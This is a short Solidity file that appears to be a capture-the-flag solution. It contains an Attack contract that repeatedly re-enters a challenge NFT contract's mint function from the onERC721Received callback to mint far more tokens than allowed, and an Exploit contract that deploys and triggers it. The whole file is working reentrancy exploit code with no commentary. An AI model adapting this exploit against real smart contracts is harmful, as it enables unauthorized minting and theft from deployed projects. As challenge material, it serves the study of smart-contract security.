// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./Setup.sol";


contract Attack is IERC721Receiver{

    MintChocolate nft;
    uint256 count;

    function go(MintChocolate _nft) external {
        nft = _nft;
        nft.mint(10);
    }
    function onERC721Received(
            address operator,
            address from,
            uint256 tokenId,
            bytes calldata data
        ) external returns (bytes4) {
            if(count < 100){
                count += 10;
                nft.mint(10);
            }
            return IERC721Receiver.onERC721Received.selector;
        }

}

contract Exploit {
    constructor(Setup setup) payable {
        MintChocolate mintChocolate = setup.TARGET();
        Attack attackContract = new Attack();
        attackContract.go(mintChocolate);
    }
}
